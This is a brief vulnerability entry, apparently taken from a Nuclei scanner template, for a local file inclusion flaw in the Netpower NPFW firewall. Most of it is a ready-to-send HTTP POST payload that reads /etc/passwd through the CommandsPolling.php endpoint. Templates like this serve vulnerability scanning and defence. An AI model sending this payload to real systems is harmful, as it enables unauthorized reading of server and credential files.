# Vulnerability: Netpower NPFW - Local File Inclusion
**Classification:** NETPOWER
**Source:** Nuclei Template (`netpower-npfw-lfi.yaml`)

## Description
Netpower NPFW firewall has an arbitrary file read vulnerability. Due to insufficient code filtering, it can read any file on the server

## Vulnerable Code Pattern / Exploit Payload
```http
POST /direct/polling/CommandsPolling.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
```

